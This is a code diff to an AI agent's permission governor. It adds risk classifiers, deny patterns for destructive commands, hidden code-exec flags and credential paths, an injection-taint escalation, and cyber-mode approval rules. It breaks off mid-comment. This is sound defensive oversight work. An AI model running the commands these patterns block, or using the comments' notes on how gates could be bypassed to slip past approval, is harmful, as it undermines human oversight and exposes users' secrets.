@@ -1,16 +1,19 @@
 import { AsyncLocalStorage } from 'node:async_hooks'
+import { addToTaint, createTaint, escalateForTaint, type InjectionHit } from './injectionGuard.ts'
 import { DEFAULT_ARTIFACT_PATHS } from '../battmann/artifactPaths.ts'
 import { DATASCIENCE_TOOLS, datascienceEffect } from '../datascience/effects.ts'
 import { SYSINTEL_RECORD_DIR, SYSINTEL_TOOLS, sysintelEffect } from '../sysintel/effects.ts'
 import { skillCapability } from '../skills/capabilities.ts'
 import { currentAgent, isPathWithinWorkspace, resolveWorkspacePath } from './context.ts'
 import { assertWriteWithinSessionScope, currentSessionScope } from '../session/scope.ts'
-import { commandMayReadSensitiveData, isEliaTrustFile } from './sensitivePaths.ts'
+import { ELIA_TRUST_MENTION, commandMayReadSensitiveData, isEliaTrustFile, unquoteShellText } from './sensitivePaths.ts'
+import { MAX_SCRIPT_DEPTH, argvInvocation, localProgram, shellInvocation, type ProgramInvocation } from './localProgram.ts'
 import { pauseToolSpinner, resumeToolSpinner } from '../ui/stream.ts'
 import { applyPolicy } from './policy.ts'
 import { assessDatabaseRequest } from '../devdb/policy.ts'
 import { addAllowRule, canPersistPrefixRule, isAllowlisted, ruleFor, type AllowScope } from './allowStore.ts'
 import { consumePreauth, currentBranch, isPreauthorized, preauthPath } from './preauth.ts'
+import { activeMode } from './mode.ts'
 import { approveSelfEditFile, needsSelfEditApproval, SELF_EDIT_INTENT, selfEditLabel, selfEditRefusal, setSelfEditAllowed } from './selfEdit.ts'
 import { basename, dirname, relative, resolve as resolvePath } from 'node:path'
 import { REPORTING_TOOLS } from './reportingTools.ts'
@@ -78,6 +81,18 @@ export interface ActionGovernor {
   check(request: ActionRequest): Promise<ActionGateResult>
   stats(): ActionGovernorStats
   /**
+   * Charges one action against the budget for a call a durable, signed approval
+   * already cleared (agentLoop's alreadyApproved path skips `check`). False
+   * when the budget is spent, in which case the call must not run.
+   */
+  chargeApprovedAction?(): boolean
+  /**
+   * Text addressed to an AI as instructions was found in `source`'s output
+   * (autonomy/injectionGuard.ts). From then on, actions aimed at what it named,
+   * and actions that cannot be undone, need approval.
+   */
+  noteUntrustedInstructions?(source: string, hits: InjectionHit[]): void
+  /**
    * The governance mode this governor enforces. Exposed so durable-action
    * approvals (goalGraph.ts) can be scoped to the mode that granted them — an
    * approval from a supervised session must not fund an unattended resume.
@@ -107,7 +122,39 @@ const CRITICAL_COMMAND = /\b(rm\s+-rf|rm\s+--no-preserve-root|mkfs|dd\s+if=|shut
 // misclassified; only the command actually being run counts. `sudo` is an
 // allowed prefix modifier (it still runs the named verb, just elevated), not
 // an arbitrary preceding word.
+// `apt`/`apt-get install` is here for the same reason as pip and npm, and
+// stronger: a distribution package runs maintainer scripts as root. The sudo
+// form was already critical via `sudo\b` in CRITICAL_COMMAND, but a bare
+// `apt install` — which is what a rootless WSL container, a vagrant box, or a
+// passwordless sudoers entry produces — matched no named class at all and fell
+// through to shell.unknown, so a standing grant on shell.code-exec would not
+// have covered it. Start-anchored, so `echo apt install` is not misread as one.
 const CODE_EXEC_COMMAND = /^(?:\S+=\S+\s+)*(?:command\s+)?(?:sudo\s+)?(?:pip3?\s+install|npm\s+(?:add|install|i|ci)|pnpm\s+(?:add|install|i|ci)|yarn\s+(?:(?:global|dlx)\s+)?(?:add|install|set\s+version)|bun\s+(?:add|install|i))\b/i
+/**
+ * Bare `apt install` / `apt-get install` — the rootless form a passwordless
+ * sudoers entry, a vagrant box, or a rootless WSL container produces, where
+ * there is no `sudo` token to catch.
+ *
+ * Deliberately NOT folded into CODE_EXEC_COMMAND. Its whole reason to exist is
+ * that a standing `shell.code-exec` grant (which is what `/scope all` records)
+ * would otherwise not cover a security run's `apt install gdb` — that grant is a
+ * cyber-scoped permission, and this is the classifier that makes it reach the
+ * installs it was given for. Classifying it everywhere would change what every
+ * other mode sees for the same command, so it is applied only where the grant
+ * that needs it exists. Outside cyber the command falls back to `shell.unknown`,
+ * which is critical and asks, exactly as it did before.
+ */
+const CYBER_PACKAGE_INSTALL_COMMAND = /^(?:\S+=\S+\s+)*(?:command\s+)?(?:sudo\s+)?apt(?:-get)?\s+install\b/i
+// The same supply-chain hazard reached through an interpreter instead of the
+// package manager directly: `python3 -m pip install`, `py -m pip`, and the
+// `-m ensurepip`/`-m venv --upgrade-deps` bootstraps all run arbitrary build
+// and setup code. CODE_EXEC_COMMAND cannot see them because it is start-anchored
+// on the package manager, so they would otherwise fall to `shell.unknown` — and
+// cyber mode auto-allows that catch-all for ordinary writes, which would let an
+// install run unasked around the gate built for it. Kept separate from
+// CYBER_PACKAGE_INSTALL_COMMAND because this one is the same hazard in every
+// mode, not a cyber-only allowance.
+const INTERPRETER_PACKAGE_INSTALL_COMMAND = /^(?:\S+=\S+\s+)*(?:command\s+)?(?:sudo\s+)?(?:python3?|py(?:\.exe)?)\s+-m\s+(?:pip3?|ensurepip|venv)\b/i
 // Docker build/run/exec/compose/deploy and scp/rsync/rcp/sftp execute arbitrary
 // code (RUN steps, container entrypoint, remote shell) with the ability to
 // mount the host filesystem or devices, or move data across a network. None of
@@ -161,6 +208,42 @@ const READ_ONLY_COMMAND = /^(?:command\s+)?(?:pwd|ls|find|grep|rg|git\s+(?:statu
 // Matched separately so assessCommand can exclude it from the read-only
 // allowance the same way it already excludes mv/cp/chmod etc. below.
 const SED_AWK_INPLACE_EDIT = /\b(?:sed|gsed|awk|gawk)\b[\s\S]*?(?:(?:^|\s)-i(?:[^\s]*)?(?:\s|$)|--in-place\b)/i
+// A read-only head word does not make every argument read-only. These forms run
+// a program, evaluate a script or write a file while still "just" being awk,
+// find, rg, sed, git or go: awk `system()`/`getline`/pipes, `find -exec`/
+// `-execdir`/`-ok`/`-delete`/`-fprint*`/`-fls`, `rg --pre`/`--hostname-bin`,
+// sed's `e`/`w` commands and script files, `git --output`/`--ext-diff`/
+// `--textconv`, and the `-exec`/`-toolexec`/`-vettool` hooks of `go`. Judged on
+// the unquoted text, since the shell removes quotes before the program sees
+// its arguments (`-ex''ecdir`). Such a command leaves the read-only allowance
+// and lands in shell.unknown (critical) with everything else unrecognised.
+const READ_ONLY_HEAD = /^(?:command\s+)?([A-Za-z][\w.-]*)/
+const AWK_CODE_EXEC = /\bsystem\s*\(|\bgetline\b|\||@load|@include|(?:^|\s)(?:-[A-Za-z]*f|--file|--exec|-E|--source)\b/
+const SED_CODE_EXEC = /(?:^|\s)(?:-[A-Za-z]*f[A-Za-z]*|--file(?:=\S*)?)(?:\s|$)|(?<![A-Za-z0-9_])s(.)(?:(?!\1).)*\1(?:(?!\1).)*\1[A-Za-z0-9]*[ewEW]|(?:^|[\s;{}\d$!])[eEwW](?:\s|;|}|$)|\/[eEwW](?:\s|;|}|$)/
+const CODE_EXEC_ARGUMENTS: Readonly<Record<string, RegExp>> = {
+  awk: AWK_CODE_EXEC,
+  gawk: AWK_CODE_EXEC,
+  mawk: AWK_CODE_EXEC,
+  nawk: AWK_CODE_EXEC,
+  sed: SED_CODE_EXEC,
+  gsed: SED_CODE_EXEC,
+  find: /(?:^|\s)-(?:exec|execdir|ok|okdir|delete|fprint0?|fprintf|fls)\b/i,
+  rg: /(?:^|\s)--(?:pre|hostname-bin)(?:-glob)?(?:=|\s|$)/i,
+  git: /(?:^|\s)--(?:output|ext-diff|textconv)\b/i,
+  go: /(?:^|\s)-{1,2}(?:exec|toolexec|vettool)(?:=|\s|$)/i,
+  cargo: /(?:^|\s)--config\b/i,
+}
+const BRACE_LIST = /\{[^{}]*,[^{}]*\}/
+function readOnlyCommandRunsCode(command: string): boolean {
+  const text = unquoteShellText(command).trim()
+  const match = READ_ONLY_HEAD.exec(text)
+  const head = match?.[1]?.toLowerCase() ?? ''
+  const pattern = CODE_EXEC_ARGUMENTS[head]
+  if (!pattern || !match) return false
+  const args = text.slice(match[0].length)
+  // Brace lists expand into separate words (`{-ex,ecdir}`), hiding a flag from the text test.
+  return pattern.test(args) || (pattern !== AWK_CODE_EXEC && pattern !== SED_CODE_EXEC && BRACE_LIST.test(args))
+}
 // `git branch` is read-only-by-default (no args, or a listing flag), but the
 // same subcommand also deletes (-d/-D/--delete), force-renames (-M), or
 // otherwise mutates a branch — none of which READ_ONLY_COMMAND's word-level
@@ -172,6 +255,19 @@ const GIT_BRANCH_LIST_ONLY = /^(?:command\s+)?git\s+branch(?:\s+(?:-a|-r|-v|-vv|
 // before any other gate) means a harmless first line can never carry a
 // harmful tail past the start-anchored read-only allowance.
 const SHELL_CONTROL_SYNTAX = /[;&|<>`$]|[\r\n]|\$\(|\b(?:eval|exec|source)\b/i
+// A lone redirection is a write, not a composition: `strings x > out.txt`
+// and `gdb -batch -ex run < ./in` name exactly one program and one file. Split
+// from SHELL_CONTROL_SYNTAX so cyber mode can allow the write while the
+// composition operators stay refused. Heredocs (`<<`, `<<-`, `<<EOF`) feed a
+// multi-line body to stdin and are excluded deliberately — they are a way to
+// paste a script past a single-command check. `>&`/`&>` (fd duplication) and
+// `&` (background, sequencing) are composition, not redirection, so they are
+// excluded too and fall to the composed gate below.
+// Composition operators. `&` covers both sequencing (`;`-like) and background,
+// and `&&`/`&>` are covered by it too, so none of them can be mistaken for a
+// redirection.
+const SHELL_COMPOSITION = /[;&|`$]|[\r\n]|\$\(/
+const REDIRECT_OPERATOR = /(?:^|[^0-9<>])>{1,2}(?!&)|(?:^|[^0-9<])<{1,2}(?!<|&)/
 const SECRET_KEY = /(password|passwd|token|secret|api[-_]?key|authorization|cookie|credential)/i
 // Every data-upload form of curl/wget transmits local content to a remote
 // host — inline `-d`/`--data`, `-d@file`/`--data @file` (payload read from a
@@ -228,7 +324,14 @@ export const READ_ONLY_ROLES: ReadonlySet<string> = new Set(['scout', 'designer'
 const DATASCIENCE_TOOL_NAMES: ReadonlySet<string> = new Set(DATASCIENCE_TOOLS)
 
 /** Secret-bearing paths as analysis code names them (open('.env'), Path.home() / '.aws' / …). */
-const PYTHON_SECRET_PATH = /(?:^|[\s'"/\\(])\.env(?:\.[\w.-]+)?\b|\.(?:ssh|aws|azure|kube|gnupg|docker)\b|\.(?:netrc|npmrc|pypirc|git-credentials)\b|\bid_(?:rsa|dsa|ecdsa|ed25519)\b|\.config[\\/]gcloud|battmann[\w.-]*\.sqlite|\.(?:pem|p12|pfx)\b/i
+const PYTHON_SECRET_PATH_BASE = /(?:^|[\s'"/\\(])\.env(?:\.[\w.-]+)?\b|\.(?:ssh|aws|azure|kube|gnupg|docker)\b|\.(?:netrc|npmrc|pypirc|git-credentials)\b|\bid_(?:rsa|dsa|ecdsa|ed25519)\b|\.config[\\/]gcloud|battmann[\w.-]*\.sqlite|\.(?:pem|p12|pfx)\b/i
+// Elia's own trust store, from the same definitions the shell read guard uses, plus the
+// names it goes by in code: a path built in pieces (`'.config', 'elia'`), the pre-authorization
+// key, the standing-approval and policy files, and the per-user config.env.
+const PYTHON_SECRET_PATH = new RegExp(
+  [PYTHON_SECRET_PATH_BASE.source, ...ELIA_TRUST_MENTION, String.raw`\.config\W{1,8}elia\b`, String.raw`\bpreauth\b`, String.raw`\b(?:allow|policy)\.json\b`, String.raw`\bconfig\.env\b`].join('|'),
+  'i',
+)
 
 function hostOf(url: string): string {
   try {
@@ -299,8 +402,11 @@ const neverRemembered = (intent: string): boolean => intent.startsWith(SIGNOFF_I
 
 /** True when a path is inside the System Intelligence record (written only through si_* tools). */
 function isSysintelRecordPath(resolved: string, cwd: string): boolean {
-  const rel = relative(resolvePath(cwd), resolved).split('\\').join('/')
-  return rel === SYSINTEL_RECORD_DIR || rel.startsWith(`${SYSINTEL_RECORD_DIR}/`)
+  // Case-folded, like isEliaTrustFile and SYSINTEL_RECORD_MENTION: on a case-insensitive
+  // filesystem `.ELIA/SYSINTEL/...` names the same record.
+  const rel = relative(resolvePath(cwd), resolved).split('\\').join('/').toLocaleLowerCase()
+  const record = SYSINTEL_RECORD_DIR.toLocaleLowerCase()
+  return rel === record || rel.startsWith(`${record}/`)
 }
 
 const SYSINTEL_RECORD_MENTION = /\.elia[\\/]+sysintel\b/i
@@ -351,18 +457,21 @@ export function assessAction(request: ActionRequest, cwd = currentAgent().cwd ??
   const joined = values.join(' ')
   const resources = values.filter((value) => /[\\/]|https?:\/\//i.test(value)).slice(0, 4)
 
-  if (name === 'run_command') return assessCommand(joined, cwd)
+  if (name === 'run_command') return assessCommand(joined, cwd, { invocation: () => shellInvocation(input.command, input.cwd, cwd) })
   if (name === 'run_program') {
     const program = typeof input.program === 'string' ? input.program : ''
     const args = Array.isArray(input.args) ? input.args.filter((arg): arg is string => typeof arg === 'string') : []
-    return assessCommand([program, ...args].join(' '), cwd)
+    return assessCommand([program, ...args].join(' '), cwd, { invocation: () => argvInvocation([program, ...args], input.cwd, cwd) })
   }
   // `process start` launches a shell command exactly as run_command does — it
   // just doesn't wait for it — so it gets the same command assessment. The
   // other actions only read or stop processes this session itself started.
   if (name === 'process') {
     const action = typeof input.action === 'string' ? input.action : ''
-    if (action === 'start') return assessCommand(typeof input.command === 'string' ? input.command : '', cwd)
+    if (action === 'start') {
+      const command = typeof input.command === 'string' ? input.command : ''
+      return assessCommand(command, cwd, { invocation: () => shellInvocation(command, input.cwd, cwd) })
+    }
     // `send` joins them: it writes one line to a process this session itself
     // started, so it is bounded by the same argument as logs and list.
     if (action === 'logs' || action === 'list' || action === 'stop' || action === 'send') {
@@ -386,6 +495,13 @@ export function assessAction(request: ActionRequest, cwd = currentAgent().cwd ??
   if (name === 'deployment') {
     const action = typeof input.action === 'string' ? input.action : 'unknown'
     const target = typeof input.target === 'string' ? input.target : 'unknown'
+    // The docker provider resolves to a real `docker build` / `docker push`. Asked for directly through
+    // run_command, each is critical (shell.remote: Dockerfile RUN steps execute arbitrary code, a push
+    // leaves the machine); reaching the same command through this tool must not lower it to review.
+    if (input.provider === 'docker' && (action === 'build' || action === 'deploy')) {
+      const docker = assessCommand(action === 'build' ? 'docker build .' : 'docker push image', cwd)
+      return { ...docker, reason: `deployment ${action} with the docker provider runs \`docker ${action === 'build' ? 'build' : 'push'}\`: ${docker.reason}`, resources }
+    }
     if (action === 'plan' || action === 'build' || action === 'verify') {
       return assessment('review', 'approve', `deployment ${action} is a bounded release workflow step`, `deployment.${action}`, resources, true)
     }
@@ -556,7 +672,7 @@ export function assessAction(request: ActionRequest, cwd = currentAgent().cwd ??
     return assessment('safe', 'allow', `${name} is workspace-scoped and checkpointable`, name, path ? [path] : [], true)
   }
 
-  if (name === 'read_file' || name === 'list_files' || name === 'grep' || name === 'find_symbol' || name === 'recall' || name === 'brain' || name === 'board_read' || name === 'board_post' || name === 'todo_write' || name === 'why' || name === 'record_rationale' || name === 'note_lesson') {
+  if (name === 'read_file' || name === 'list_files' || name === 'grep' || name === 'find_symbol' || name === 'recall' || name === 'brain' || name === 'board_read' || name === 'board_post' || name === 'todo_write' || name === 'why' || name === 'record_rationale' || name === 'note_lesson' || name === 'load_tools') {
     const path = typeof input.path === 'string' ? input.path : ''
     return path && !isPathWithinWorkspace(path, cwd)
       ? assessment('critical', 'approve', `${name} may access data outside the active workspace or through an invalid path`, name, [path], false)
@@ -574,11 +690,20 @@ export function assessAction(request: ActionRequest, cwd = currentAgent().cwd ??
   if (name === 'paper') {
     return assessment('safe', 'allow', 'paper lookup is read-only retrieval from public scholarly indexes; no external state changes', 'paper', resources, true)
   }
+  if (name === 'knowledge') {
+    return assessment('safe', 'allow', 'knowledge-base lookup is read-only retrieval from elia\'s own search API; no external state changes', 'knowledge', resources, true)
+  }
   if (name === 'web_fetch') {
     // Redirects are followed now, but each hop is re-validated against the
     // public-address policy before the socket opens, so the constraint that
     // made this safe still holds per hop rather than by refusing to move.
     return assessment('safe', 'allow', 'web fetch is a bounded read-only GET restricted to public http(s) addresses, with every redirect hop re-validated', 'web_fetch', resources, true)
+  }
+  if (name === 'digest') {
+    return assessment('safe', 'allow', 'digest reads a workspace file through the guarded path check, or a public URL through the same GET as web_fetch, and only sends its text to the configured model; it writes nothing', 'digest', resources, true)
+  }
+  if (name === 'compare_page') {
+    return assessment('safe', 'allow', 'page comparison reads the original through the same public-address GET as web_fetch and the copy as a guarded workspace read; it writes nothing', 'compare_page', resources, true)
   }
 
   if (name === 'visualize') {
@@ -752,20 +877,53 @@ export function assessAction(request: ActionRequest, cwd = currentAgent().cwd ??
     return assessment('review', 'approve', 'engagement_report compiles a workspace-local Markdown report from logged findings', 'engagement_report', resources, true)
   }
 
+  // flag_verify never touches a target: it hashes a candidate string and reads
+  // local challenge artifacts to see whether that string is actually in them.
+  // That read is bounded and content-blind — it returns whether a byte sequence
+  // was present, never the file's contents — so it cannot be used to exfiltrate
+  // a file. With an engagement slug it also appends a verdict line inside that
+  // engagement's own recon/ folder, which is the same workspace-local write
+  // log_finding does above. The capability contract still lists it critical on
+  // purpose: the contract records that a flag verdict is a security claim, while
+  // the runtime assessment reflects what this specific tool actually does.
+  if (name === 'flag_verify') {
+    return assessment('safe', 'allow', 'flag_verify hashes a candidate flag and searches local challenge artifacts for it without returning their contents; any engagement record is written inside that engagement recon/ folder', 'flag_verify', resources, true)
+  }
+
   // The CTF and triage tools are observation, not action, so they sit beside
   // project_profile and dependency_audit rather than the scanners above:
-  // ctf_toolchain probes which binaries exist (a `--version`-style read), and
-  // ctf_playbook and security_triage only read local files. An install plan
-  // ctf_toolchain prints is text, not an execution — the commands still go
-  // through run_command's own assessment when the model actually runs one.
+  // ctf_playbook and security_triage only read local files.
+  //
+  // ctf_toolchain is now split, because it stopped being one thing. Without
+  // `install` it is still exactly what it was: PATH lookups and `--version`
+  // probes, with an install plan that is text. With `install: true` it runs
+  // package-manager commands, and the old rationale above — "an install plan it
+  // prints is text, not an execution" — became false the moment that flag
+  // existed. Left as safe/allow it would have become a sudo-capable approval
+  // bypass dressed as a read-only detector, so the flag is what selects the
+  // treatment and the read-only path keeps the cheap classification.
   if (name === 'ctf_toolchain') {
-    return assessment('safe', 'allow', 'ctf_toolchain reports which security tools are installed and prints an install plan without running any of it', 'ctf_toolchain', resources, true)
+    if (input.install === true) {
+      return assessment('critical', 'approve', 'ctf_toolchain with install:true runs package-manager commands, including sudo apt, to install missing security tools — it changes machine state outside the workspace', 'ctf_toolchain.install', resources, false)
+    }
+    return assessment('safe', 'allow', 'ctf_toolchain without install only runs PATH lookups and --version probes and prints an install plan without running any of it', 'ctf_toolchain', resources, true)
   }
   if (name === 'ctf_playbook') {
     return assessment('safe', 'allow', 'ctf_playbook returns a stored triage procedure and executes nothing', 'ctf_playbook', resources, true)
   }
+  if (name === 'cyberbrain') {
+    return assessment('safe', 'allow', 'cyberbrain loads the local CTF/VAPT retrieval corpus and ranks its chunks — it reads files and executes nothing', 'cyberbrain', resources, true)
+  }
   if (name === 'security_triage') {
     return assessment('safe', 'allow', 'security_triage parses recon output already saved under the engagement folder', 'security_triage', resources, true)
+  }
+  if (name === 'ask_user') {
+    // Critical, and deliberately not in CYBER_SETTLEABLE. A run that has asked
+    // for more money and is told yes has not been given blanket authority over
+    // the rest of the session: a second ask, or a different question dressed up
+    // as budget, still comes to a person. It is the one ask, not a standing
+    // yes, and settling it would turn a question into a permission.
+    return assessment('critical', 'approve', 'ask_user puts a question to the operator and its answer decides whether the run keeps spending - cyber mode only, and never settled by an earlier approval', 'ask_user', resources, false)
   }
 
   // A read-only worker (a scout researching, a critic reviewing) cannot change
@@ -848,6 +1006,62 @@ export function assessAction(request: ActionRequest, cwd = currentAgent().cwd ??
 const SETTLEABLE_ONCE = new Set(['shell', 'shell.composed', 'shell.unknown', 'github.repo_create', 'github.contribute', SELF_EDIT_INTENT])
 
 /**
+ * The extra intents that settle after one answer, but only in cyber mode.
+ *
+ * SETTLEABLE_ONCE is a global, so widening it would widen dev mode too, and these
+ * five are not things a coding run should inherit: a package install runs build
+ * scripts, a sensitive read is exactly what `shell.sensitive-read` exists to
+ * gate, and a live-target probe is the one action in the codebase whose blast
+ * radius is somebody else's machine. A cyber run lives or dies on not stopping
+ * for each of them — a CTF solve needs gdb, radare2 and ghidra installed, which
+ * means sudo apt, and a run that asks per command never finishes the loop.
+ *
+ * Scoped to `activeMode() === 'cyber'` and consulted only through
+ * `settlesOnceFor()`, so a dev turn sees exactly the set it saw before. The
+ * standing grant is still required: this widens *which classes* may settle, not
+ * who may settle them, so a cyber run that has not been granted the class still
+ * asks, refuses in unattended mode, or is refused by policy.
+ */
+const CYBER_SETTLEABLE = new Set(['shell.code-exec', 'shell.remote', 'shell.sensitive-read', 'run_security_tool', 'http_probe', 'ctf_toolchain.install'])
+
+/**
+ * The intents a cyber run may perform unattended with no standing grant.
+ *
+ * This is deliberately a short, explicit list rather than a widening of
+ * SETTLEABLE_ONCE or CYBER_SETTLEABLE, because those answer a different
+ * question — "may one answer stand in for the next?" — whereas this answers
+ * "may an unattended cyber run do this at all, unasked?". Widening either
+ * existing set would quietly change dev mode or the settling rules.
+ *
+ *   shell.solve   analysis tools and interpreter script runs (assessCommand,
+ *                 cyber-only branch)
+ *   shell.redirect  `> out.txt` style writes (assessCommand redirect gate)
+ *   shell.unknown   the catch-all for a command nothing else classified, which
+ *                 is how `cp`, `mv`, `mkdir` and `touch` reach this set
+ *
+ * Absent, and still refused in cyber: `shell.composed` (pipes, `;`, `&`,
+ * backticks, `$(`), `shell.external-write`, `shell.sensitive-read`,
+ * `shell.remote`, `shell.code-exec`, and every trust-control write. The
+ * refusal those intents get is the protection against injected text in a
+ * challenge binary or a fetched page becoming executed code, so it does not
+ * widen with the rest of this.
+ */
+const CYBER_AUTO_ALLOW = new Set(['shell.solve', 'shell.redirect', 'shell.unknown'])
+
+/**
+ * Whether one answer settles this intent for the rest of the run in the mode
+ * this turn is actually running as.
+ *
+ * Deliberately a single chokepoint: both the remember-a-decision path and the
+ * keyed-by-exact-command path route through it, so there is no way to consult
+ * SETTLEABLE_ONCE directly and accidentally skip the cyber check.
+ */
+function settlesOnceFor(intent: string): boolean {
+  if (SETTLEABLE_ONCE.has(intent)) return true
+  return activeMode() === 'cyber' && CYBER_SETTLEABLE.has(intent)
+}
+
+/**
  * Review-band intents that still publish to or mutate state beyond this project
  * and a shared remote. Unattended mode auto-allows the whole review band by
  * design (local, reversible work get a standing "yes"); these are the exceptions
@@ -873,7 +1087,7 @@ const OUTBOUND_REVIEW_INTENTS = new Set([
  * session scope is present and returns a block reason for anything that
  * resolves outside the scope's worktree.
  */
-function sessionScopeWriteBlock(request: ActionRequest): string | undefined {
+export function sessionScopeWriteBlock(request: ActionRequest): string | undefined {
   const scope = currentSessionScope()
   if (!scope) return undefined
   const path = request.input.path
@@ -950,6 +1164,8 @@ export function createActionGovernor(options: ActionGovernorOptions = {}): Actio
   const classDecisions = new Map<string, boolean>()
   /** "Allow for this session" choices from the supervised approval menu. */
   const sessionAllow = new Set<string>()
+  /** Instructions planted in content this governor's run has read. */
+  const taint = createTaint()
   const sessionKey = (request: ActionRequest, assessment: ActionAssessment): string =>
     request.name === 'run_command' || (request.name === 'process' && request.input.action === 'start')
       ? `${request.name}:${String(request.input.command ?? '').trim().split(/[\s;|&]+/, 1)[0] ?? ''}`
@@ -978,10 +1194,13 @@ export function createActionGovernor(options: ActionGovernorOptions = {}): Actio
       // outright, or raise its decision from allow to approve. Applied before
       // the budget check so a policy-blocked action never consumes budget.
       const policied = applyPolicy(baseAssessment, request, options.cwd)
-      const assessment = policied.assessment
       if (policied.blocked) {
-        return { allowed: false, assessment, message: policied.message }
+        return { allowed: false, assessment: policied.assessment, message: policied.message }
       }
+      // After planted instructions were read, some allowed actions need a
+      // person — and no standing allow rule may wave them through.
+      const escalated = escalateForTaint(taint, request.name, request.input, policied.assessment)
+      const assessment = escalated ?? policied.assessment
       if (maxActions > 0 && actionCount >= maxActions) {
         blockedByBudget += 1
         return {
@@ -1006,6 +1225,7 @@ export function createActionGovernor(options: ActionGovernorOptions = {}): Actio
       // interactive session.
       if (
         mode === 'supervised' &&
+        !escalated &&
         !neverRemembered(assessment.intent) &&
         (sessionAllow.has(sessionKey(request, assessment)) || isAllowlisted(request, assessment, options.cwd))
       ) {
@@ -1026,7 +1246,52 @@ export function createActionGovernor(options: ActionGovernorOptions = {}): Actio
       // this exact intent, for this exact project + branch, before the run
       // started (`elia auto --authorize`, preauth.ts) — a real advance "yes"
       // recorded by a person, never something the model can grant itself.
-      if (mode === 'unattended' && assessment.risk === 'critical' && !SETTLEABLE_ONCE.has(assessment.intent)) {
+      // A human's advance "yes" is consulted for any critical action in
+      // unattended mode, and it is the only zero-prompt path an unattended run
+      // has. It is keyed by *intent*, not by command, so it is checked before
+      // the settleable exemption below: a cyber run that was pre-granted
+      // `shell.code-exec` is authorised for installing tools, and without this
+      // it would fall through to the refusal and ask a question nobody is there
+      // to answer.
+      //
+      // Deliberately scoped to cyber mode. For every other mode the preauth
+      // check stays exactly where it was — inside the non-settleable branch —
+      // so widening the settleable set above cannot be used to hand a settleable
+      // intent an unattended pass in dev, where one yes must not cover a whole
+      // class of shell.
+      if (mode === 'unattended' && assessment.risk === 'critical' && activeMode() === 'cyber' && !neverRemembered(assessment.intent)) {
+        const cyberBranch = await resolvedBranch()
+        if (isPreauthorized(assessment.intent, cwd, cyberBranch)) {
+          const grant = consumePreauth(assessment.intent, cwd, cyberBranch)
+          actionCount += 1
+          return {
+            allowed: true,
+            assessment: { ...assessment, decision: 'allow', reason: `${assessment.reason} (pre-authorized: ${preauthPath()} grant for "${assessment.intent}", use #${grant?.usedCount ?? '?'})` },
+          }
+        }
+      }
+      // Cyber mode's own standing permission for writing and running solve
+      // scripts, with no grant required. Placed before the settleable check so
+      // it does not depend on SETTLEABLE_ONCE, and before the non-settleable
+      // refusal so these three intents never reach it.
+      //
+      // Scoped three ways on purpose. Cyber only, so a dev or research turn
+      // sees exactly the policy it saw before. Critical-risk only, so this
+      // never re-decides a review-band action the review band already governs.
+      // And only the three intents listed in CYBER_AUTO_ALLOW — exfil
+      // (shell.external-write), sensitive reads, remote/container execution,
+      // composed commands, supply-chain installs and the trust-control writes
+      // all keep their own intents and stay refused. `/scope all` is not
+      // needed: the operator asked for a cyber run to be able to write files
+      // and run scripts without a second authorization step.
+      if (mode === 'unattended' && assessment.risk === 'critical' && activeMode() === 'cyber' && CYBER_AUTO_ALLOW.has(assessment.intent)) {
+        actionCount += 1
+        return {
+          allowed: true,
+          assessment: { ...assessment, decision: 'allow', reason: `${assessment.reason} (cyber mode permits writes and solve scripts for this intent)` },
+        }
+      }
+      if (mode === 'unattended' && assessment.risk === 'critical' && !settlesOnceFor(assessment.intent)) {
         const branch = await resolvedBranch()
         if (isPreauthorized(assessment.intent, cwd, branch)) {
           const grant = consumePreauth(assessment.intent, cwd, branch)
@@ -1079,7 +1344,7 @@ export function createActionGovernor(options: ActionGovernorOptions = {}): Actio
       // its own "yes" — that is the one-approval-per-boundary property A2-03
       // checks for. Everything else keeps its risk:intent class key.
       const scopedCommand = (() => {
-        if (!SETTLEABLE_ONCE.has(assessment.intent)) return undefined
+        if (!settlesOnceFor(assessment.intent)) return undefined
         let raw: string | undefined
         if (request.name === 'run_command') {
           raw = typeof request.input.command === 'string' ? request.input.command : undefined
@@ -1185,7 +1450,18 @@ export function createActionGovernor(options: ActionGovernorOptions = {}): Actio
 
   return {
     mode,
+    chargeApprovedAction() {
+      if (maxActions > 0 && actionCount >= maxActions) {
+        blockedByBudget += 1
+        return false
+      }
+      actionCount += 1
+      return true
+    },
     stats: () => ({ maxActions, consumed: actionCount, exhausted: maxActions > 0 && actionCount >= maxActions, blockedByBudget }),
+    noteUntrustedInstructions(source, hits) {
+      addToTaint(taint, source, hits)
+    },
     async check(request) {
       const result = await decide(request)
       // Every way a self_edit gets through — a yes at the prompt, a remembered
@@ -1218,34 +1494,102 @@ export function activeActionGovernor(): ActionGovernor {
  * to it, instead of discovering at verification time that the gate is unwinnable.
  */
 export function blockedInUnattendedMode(command: string, cwd = process.cwd()): boolean {
-  return assessCommand(command, cwd).risk === 'critical'
+  // A plan names the program it is about to write, so a script that does not
+  // exist yet counts as local when it would land inside the workspace. At run
+  // time the governor still requires the file itself.
+  return assessCommand(command, cwd, { invocation: () => shellInvocation(command, undefined, cwd), planning: true }).risk === 'critical'
+}
+
+interface CommandContext {
+  /**
+   * The program the command runs and the directory it runs in, when both are
+   * certain. A thunk: it reads the filesystem, and only a command that reaches
+   * the last check needs it.
+   */
+  invocation?: () => ProgramInvocation | undefined
+  /** Plan-time prediction (blockedInUnattendedMode): the script may not be written yet. */
+  planning?: boolean
+  /** package.json script nesting already followed. */
+  depth?: number
 }
 
 /**
- * Classify a shell command by what it *does*, not where it runs.
+ * Classify a shell command by what it *does*.
  *
- * `_cwd` is deliberately unread. Every branch below is a pattern match on the
- * command string — network egress, package installs, remote execution,
- * irreversible side effects — and none of those change meaning with the
- * working directory. Path scoping is a separate gate (workspace-path and
- * protected-file checks); folding it in here would give one classifier two
- * jobs and make each harder to reason about. The parameter stays so the
- * signature matches `blockedInUnattendedMode`, which is exported for
- * plan-time checking.
+ * Every branch but the last is a pattern match on the command string — network
+ * egress, package installs, remote execution, irreversible side effects — and
+ * none of those change meaning with the working directory. The one question
+ * that does is whether the command runs the project's own program
+ * (localProgram.ts): that needs the file on disk, resolved from the directory
+ * the command runs in, so `cwd` (the workspace root) and the invocation are
+ * read there and nowhere else. It is asked last, after every hazard has had
+ * its turn, so it can only lift what would otherwise be `shell.unknown`.
  */
-function assessCommand(command: string, _cwd: string): ActionAssessment {
+/**
+ * Whether `command` carries redirection and nothing else that composes.
+ *
+ * Reached only for a command that already tripped SHELL_CONTROL_SYNTAX, so
+ * the question is not "does it redirect" but "is the redirect all it does".
+ * Strips the operator tokens themselves, then refuses if any composition
+ * character, a newline, or an `eval`/`exec`/`source` survives — those mean
